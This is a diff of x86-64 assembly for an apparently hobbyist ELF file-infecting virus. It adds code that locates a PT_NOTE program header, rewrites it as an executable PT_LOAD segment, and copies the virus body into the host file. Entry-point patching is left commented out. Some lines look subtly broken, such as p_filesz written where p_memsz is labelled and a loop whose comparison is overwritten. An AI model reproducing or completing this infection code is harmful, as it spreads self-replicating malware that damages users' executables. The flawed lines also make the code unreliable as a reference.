@@ -119,7 +119,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   test    rax,  rax
   jne     .InfectExit
 
-  sub     rsp,  0x18
+  sub     rsp,  0x20
   push    rbx
   push    r9
   push    rdi
@@ -136,8 +136,8 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   push    rax                         ; rsp         -> FileMap (ELF-HDR)
                                       ; rsp + 0x8   -> FileSz
                                       ; rsp + 0x10  -> Old Entry
-                                      ; rsp + 0x18  -> ???
-                                      ; rsp + 0x20  -> ???
+                                      ; rsp + 0x18  -> Program Hdr
+                                      ; rsp + 0x20  -> EOF
 
   ;; SAVE OLD ENTRY >-------------------------------------------------------<
   
@@ -161,12 +161,78 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov     [rsp + 0x10], rax
 
   ;; LOOP THROUGH PHDR >----------------------------------------------------<
-  ;;;; IF PH_TYPE == PT_NOTE THEN BREAK >-----------------------------------<
+
+  xor     rcx,  rcx
+  mov     rax,  [rsp]
+  mov     rdx,  rax
+  add     rax,  [rax + elf64_hdr.e_phoff]
+
+  .ProgramHdrLoop:
+    movzx   rbx,  word [rdx + elf64_hdr.e_phentsize]  ; phentsize
+    imul    rbx,  rcx                                 ; phentsize * i
+    
+    lea     r12,  [rax + rbx]
+    mov     [rsp + 0x18], r12                         ; store prog_hdr on stack
+
+    movzx   rbx,  word [rax + rbx]  ; rbx = *(phoff + (phentsize * i))
+    
+    cmp     rbx, PT_NOTE
+    je      .ConvertPtNote
+    
+    cmp     rcx,  [rax + elf64_hdr.e_phnum]
+    inc     rcx,  
+    jnz     .ProgramHdrLoop
+
+  jmp .InfectCleanUp
+
   ;; CONVERT TO PT_LOAD >---------------------------------------------------<
+
+  .ConvertPtNote:
+  
+  mov   dword [r12 + elf64_phdr.p_type],  PT_LOAD     ; p_type
+  mov   dword [r12 + elf64_phdr.p_flags], PT_FLAG_RX  ; p_flags
+  
+  mov   rcx,  VExitRoutine
+  mov   rbx,  _start
+  sub   rcx,  rbx           ; rcx = size V-Body
+
+  mov   qword [r12 + elf64_phdr.p_filesz],  rcx       ; p_filesz
+  mov   qword [r12 + elf64_phdr.p_filesz],  rcx       ; p_memsz
+
+  mov   rbx,  [rsp + 0x8]
+  sub   rbx,  rcx           ; rbx = size H-Body
+
+  mov   qword [r12 + elf64_phdr.p_offset],  rbx       ; p_offset
+
+  mov   [rsp + 0x20], rbx
+  add   rbx,  0xc000000
+
+  mov   qword [r12 + elf64_phdr.p_vaddr],   rbx       ; p_vaddr
+
   ;; WRITE SELF AT LOCATION >-----------------------------------------------<
-  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
+
+  mov   rcx,  VExitRoutine
+  mov   rbx,  _start
+  sub   rcx,  rbx           ; rcx = size V-Body
+
+  mov   rsi, _start         ; source address
+  mov   rdi, [rsp+0x20]     ; destination address
+  rep   movsb
+
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
+
+  ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
+
+  ; mov   rbx,  [rsp + 0x20]
+  ; movzx qword [rsp + elf64_hdr.e_entry],    rbx       ; patch entry
+  
   ;; WRITE SIGNATURE >------------------------------------------------------<
+  
+  ; lea   rbx,  [rsp]
+  ; mov   dword [rsp + 0xC], 0x534e4700
+
+  ;; OVERWRITE FILE >-------------------------------------------------------<
+
   ;; EXEC PAYLOAD (PRINT STDOUT) >------------------------------------------<
 
   .InfectCleanUp:
